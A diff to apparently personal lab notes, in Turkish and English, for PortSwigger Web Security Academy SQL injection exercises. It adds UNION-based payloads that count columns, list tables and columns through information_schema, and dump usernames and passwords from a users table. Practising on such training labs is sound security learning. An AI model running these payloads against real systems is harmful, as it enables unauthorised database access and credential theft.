@@ -44,4 +44,15 @@ versiyon => GET /filter?category=Gifts'+UNION+SELECT+@@version,+NULL#
 #      Oracle dışı veritabanlarındaki veritabanı içeriklerini listeleyen SQL enjeksiyon saldırısı      #
 ########################################################################################################
 
-5--> 
+5--> https://$YOURLABSID.web-security-academy.net/filter?category=Pets%27%20UNION%20SELECT%20username_nlemgu,%20password_mksmyq%20FROM%20users_unzwub--
+Sütun sayısı ve metinleri bul => Pets' UNION SELECT 'abc','def'--
+Tablo isimlerini ele geçir => Pets' UNION SELECT table_name, NULL FROM information_schema.tables--
+Tablodaki sütünların ayrıntılarını bul => Pets' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_unzwub'--
+tüm kullanıcıların şifrelerini bul => Pets' UNION SELECT username_nlemgu, password_mksmyq FROM users_unzwub--
+
+###################################################################################
+#      SQL injection attack, listing the database contents on Oracle              #
+#      Oracle'da veritabanı içeriklerini listeleyen SQL enjeksiyon saldırısı      #
+###################################################################################
+
+6--> 
